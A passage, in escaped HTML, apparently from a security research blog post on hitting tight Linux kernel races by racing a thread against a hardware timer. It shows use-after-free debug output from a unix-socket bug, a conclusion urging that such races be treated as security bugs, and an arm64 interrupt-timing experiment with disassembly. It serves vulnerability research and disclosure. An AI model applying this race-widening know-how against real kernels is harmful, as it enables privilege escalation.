6b 6b 6b 6b 6b 6b &amp;nbsp;kkkkkkkkkkkkkkkk&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;Object &amp;nbsp; 00000000af71b907: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &amp;nbsp;kkkkkkkkkkkkkkkk&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c4 c9"&gt;Object &amp;nbsp; 000000000d2d371e: 6b 6b 6b 6b &lt;/span&gt;&lt;span class="c6 c18 c9 c25"&gt;6c&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &amp;nbsp;kkkklkkkkkkkkkkk&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;Object &amp;nbsp; 0000000000744b35: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &amp;nbsp;kkkkkkkkkkkkkkkk&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;Object &amp;nbsp; 00000000794f2935: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &amp;nbsp;kkkkkkkkkkkkkkkk&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;Object &amp;nbsp; 000000006dc06746: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &amp;nbsp;kkkkkkkkkkkkkkkk&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;Object &amp;nbsp; 000000005fb18682: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &amp;nbsp;kkkkkkkkkkkkkkkk&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;Object &amp;nbsp; 0000000072eb8dd2: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &amp;nbsp;kkkkkkkkkkkkkkkk&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;Object &amp;nbsp; 00000000b5b572a9: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &amp;nbsp;kkkkkkkkkkkkkkkk&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;Object &amp;nbsp; 0000000085d6850b: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &amp;nbsp;kkkkkkkkkkkkkkkk&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;Object &amp;nbsp; 000000006346150b: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &amp;nbsp;kkkkkkkkkkkkkkkk&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;Object &amp;nbsp; 000000000ddd1ced: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b a5 &amp;nbsp;kkkkkkkkkkkkkkk.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;Padding &amp;nbsp;00000000e00889a7: 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a &amp;nbsp;ZZZZZZZZZZZZZZZZ&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;Padding &amp;nbsp;00000000d190015f: 5a 5a 5a 5a 5a 5a 5a 5a &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;ZZZZZZZZ&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;CPU: 7 PID: 1641 Comm: gnome-shell Tainted: G &amp;nbsp; &amp;nbsp;B D &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 5.10.0-9-amd64 #1 Debian 5.10.70-1&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;[...]&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;Call Trace:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;nbsp;dump_stack+0x6b/0x83&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;nbsp;check_bytes_and_report.cold+0x79/0x9a&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;nbsp;check_object+0x217/0x260&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;[...]&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;nbsp;alloc_debug_processing+0xd5/0x130&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;nbsp;___slab_alloc+0x511/0x570&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;[...]&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;nbsp;__slab_alloc+0x1c/0x30&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;nbsp;kmem_cache_alloc_node+0x1f3/0x210&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;nbsp;__alloc_skb+0x46/0x1f0&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;nbsp;alloc_skb_with_frags+0x4d/0x1b0&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;nbsp;sock_alloc_send_pskb+0x1f3/0x220&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;[...]&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;nbsp;unix_stream_sendmsg+0x268/0x4d0&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;nbsp;sock_sendmsg+0x5e/0x60&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;nbsp;____sys_sendmsg+0x22e/0x270&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;[...]&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;nbsp;___sys_sendmsg+0x75/0xb0&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;[...]&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;nbsp;__sys_sendmsg+0x59/0xa0&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;nbsp;do_syscall_64+0x33/0x80&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;nbsp;entry_SYSCALL_64_after_hwframe+0x44/0xa9&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;[...]&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;FIX skbuff_head_cache: Restoring 0x00000000d7142451-0x00000000d7142451=0x6b&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;FIX skbuff_head_cache: Marking all objects used&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;RIP: 0010:unix_stream_read_generic+0x72b/0x870&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;Code: fe ff ff 31 ff e8 85 87 91 ff e9 a5 fe ff ff 45 01 77 44 8b 83 80 01 00 00 85 c0 0f 89 10 01 00 00 49 8b 47 38 48 85 c0 74 23 &amp;lt;0f&amp;gt; bf 00 66 85 c0 0f 85 20 01 00 00 4c 89 fe 48 8d 7c 24 58 44 89&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;RSP: 0018:ffffb789027f7cf0 EFLAGS: 00010202&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;RAX: 6b6b6b6b6b6b6b6b RBX: ffff982d1d897b40 RCX: 0000000000000000&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;RDX: 6a0fe1820359dce8 RSI: ffffffffa81f9ba0 RDI: 0000000000000246&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;RBP: ffff982d1d897ea8 R08: 0000000000000000 R09: 0000000000000000&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;R10: 0000000000000000 R11: ffff982d2645c900 R12: ffffb789027f7dd0&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;R13: ffff982d1d897c10 R14: 0000000000000001 R15: ffff982d3390e000&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;FS: &amp;nbsp;00007f547209d740(0000) GS:ffff98309fa40000(0000) knlGS:0000000000000000&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;CS: &amp;nbsp;0010 DS: 0000 ES: 0000 CR0: 0000000080050033&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;CR2: 00007f54722cd000 CR3: 00000001b61f4002 CR4: 0000000000770ee0&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c4 c9"&gt;PKRU: 55555554&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c15" id="h.pjkt5u3x5bd1"&gt;&lt;span&gt;Conclusion(s)&lt;/span&gt;&lt;/h1&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;Hitting a race can become easier if, instead of racing two threads against each other, you race one thread against a hardware timer to create a gigantic timing window for the other thread. Hence the title! On the other hand, it introduces extra complexity because now you have to think about how timers actually work, and turns out, time is a complicated concept...&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;This shows how at least some really tight races can still be hit and &lt;/span&gt;&lt;span&gt;we should treat them&lt;/span&gt;&lt;span&gt;&amp;nbsp;as security bugs, even if it seems like they&amp;#39;d be very hard to hit at first glance.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;Also, precisely timing races is hard, and the details of how long it actually takes the CPU to get from one point to another are mysterious. (As not only exploit writers know, but also anyone who&amp;#39;s ever wanted to benchmark a performance-relevant change...)&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c15" id="h.adfta2d6xkv8"&gt;&lt;span&gt;Appendix: How impatient are interrupts?&lt;/span&gt;&lt;/h1&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;I did also play around with this stuff on arm64 a bit, and I was wondering: At what points do interrupts actually get delivered? Does an incoming interrupt force the CPU to drop everything immediately, or do inflight operations finish first? This gets particularly interesting on phones that contain two or three different types of CPUs mixed together.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;On a Pixel 4 (which has 4 slow in-order cores, 3 fast cores, and 1 faster core), I tried firing an interval timer at 100Hz (using &lt;/span&gt;&lt;span class="c4"&gt;timer_create()&lt;/span&gt;&lt;span&gt;), with a signal handler that logs the &lt;/span&gt;&lt;span class="c4"&gt;PC&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;register, while running this loop:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; 400680:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000442 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x2, x2, #0x1&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; 400684:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000421 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x1, x1, #0x1&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; 400688:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;9ac20820 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;udiv&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x0, x1, x2&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; 40068c:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91006800 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x0, x0, #0x1a&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; 400690:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000400 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x0, x0, #0x1&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; 400694:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000442 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x2, x2, #0x1&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; 400698:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000421 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x1, x1, #0x1&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; 40069c:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000442 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x2, x2, #0x1&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; 4006a0:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000421 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x1, x1, #0x1&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; 4006a4:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;9ac20820 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;udiv&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x0, x1, x2&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; 4006a8:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91006800 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x0, x0, #0x1a&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; 4006ac:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000400 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x0, x0, #0x1&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; 4006b0:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000442 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x2, x2, #0x1&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; 4006b4:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000421 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x1, x1, #0x1&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; 4006b8:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000442 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x2, x2, #0x1&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; 4006bc:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000421 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x1, x1, #0x1&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; 4006c0:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;17fffff0 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;b&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;400680 &amp;lt;main+0xe0&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;The logged interrupt PCs had the following distribution on a slow in-order core:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhqse8TiPYh3VAgo0AfMkIorhlVy5WzrvROCvjOmzMYwGS1lkK4gkTiPmgDF1X3qRsCMAo53nPrsxLJKMlTkbSgDSeOV0I19IV7Rp2w20lPrlOfnfjPX1-04VnZO7NEHYxZkRBB9zyzIpLrEcsQSqgo69j6KLkNVJQbGtEqPHdZioNkTM5X4EWDgBc-CA/s1252/image3.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhqse8TiPYh3VAgo0AfMkIorhlVy5WzrvROCvjOmzMYwGS1lkK4gkTiPmgDF1X3qRsCMAo53nPrsxLJKMlTkbSgDSeOV0I19IV7Rp2w20lPrlOfnfjPX1-04VnZO7NEHYxZkRBB9zyzIpLrEcsQSqgo69j6KLkNVJQbGtEqPHdZioNkTM5X4EWDgBc-CA/s600/image3.png" border="0" alt="A histogram of PC register values, where most instructions in the loop have roughly equal frequency, the instructions after udiv instructions have twice the frequency, and two other instructions have zero frequency." style="max-height: 750; max-width: 600;"title="A histogram of PC register values, where most instructions in the loop have roughly equal frequency, the instructions after udiv instructions have twice the frequency, and two other instructions have zero frequency." /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;and this distribution on a fast out-of-order core:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgh-hKRfnypuIT0Q_ok_NI8dQ49QqWLmvjVFKGphIShpHLeBwZTCHg-oDza4TYMB907G0aQZkEeqVFhgw4HnXbb8HKOYVuPdGrqXQMwS_72RWjp2YVBNeJXvFlDxsTiYqj053Yqd8BEXa0fqKvN3LhBeyR2iPh_Y-uYfkjW1s6mwswfvHE3iKbvZbTfJA/s1252/image7.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgh-hKRfnypuIT0Q_ok_NI8dQ49QqWLmvjVFKGphIShpHLeBwZTCHg-oDza4TYMB907G0aQZkEeqVFhgw4HnXbb8HKOYVuPdGrqXQMwS_72RWjp2YVBNeJXvFlDxsTiYqj053Yqd8BEXa0fqKvN3LhBeyR2iPh_Y-uYfkjW1s6mwswfvHE3iKbvZbTfJA/s600/image7.png" border="0" alt="A histogram of PC register values, where the first instruction of the loop has very high frequency, the following 4 instructions have near-zero frequency, and the following instructions have low frequencies" style="max-height: 750; max-width: 600;"title="A histogram of PC register values, where the first instruction of the loop has very high frequency, the following 4 instructions have near-zero frequency, and the following instructions have low frequencies" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;As always, out-of-order (OOO) cores make everything weird, and the start of the loop seems to somehow &amp;quot;provide cover&amp;quot; for the following instructions; but on the in-order core, we can see that more interrupts arrive &lt;/span&gt;&lt;span class="c6"&gt;after&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;the slow udiv instructions. So apparently, when one of those is executing while an interrupt arrives, it continues executing and doesn&amp;#39;t get aborted somehow?&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;With the following loop, which has a &lt;/span&gt;&lt;span class="c4"&gt;LDR&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;instruction mixed in that accesses a memory location that is constantly being modified by another thread:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; 4006a0:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000442 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x2, x2, #0x1&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; 4006a4:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000421 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x1, x1, #0x1&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; 4006a8:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;9ac20820 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;udiv&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x0, x1, x2&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; 4006ac:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91006800 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;add&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;x0, x0, #0x1a&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; 4006b0:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;91000400 